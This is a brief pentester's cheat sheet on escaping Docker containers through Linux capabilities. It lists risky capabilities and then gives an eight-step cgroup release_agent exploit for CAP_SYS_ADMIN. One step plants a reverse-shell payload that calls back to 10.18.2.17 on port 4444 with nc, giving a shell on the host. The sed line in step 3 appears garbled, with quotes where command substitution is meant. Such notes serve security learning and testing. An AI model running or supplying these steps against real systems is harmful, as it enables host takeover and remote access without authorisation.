## Command to list

### capsh --print

### Interesting privileges: cap_net_admin, cap_sys_time, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid, cap_setuid

## Example: If we have the sys_admin privilege, we can use the following PoC https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.

#### 1.  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

#### 2.  echo 1 > /tmp/cgrp/x/notify_on_release

#### 3.  host_path='sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab'

#### 4.  echo "$host_path/exploit" > /tmp/cgrp/release_agent

#### 5.  echo '#!/bin/sh' > /exploit

#### 6.  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.2.17 4444 >/tmp/f" >> /exploit

#### 7.  chmod a+x /exploit

#### 8.  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
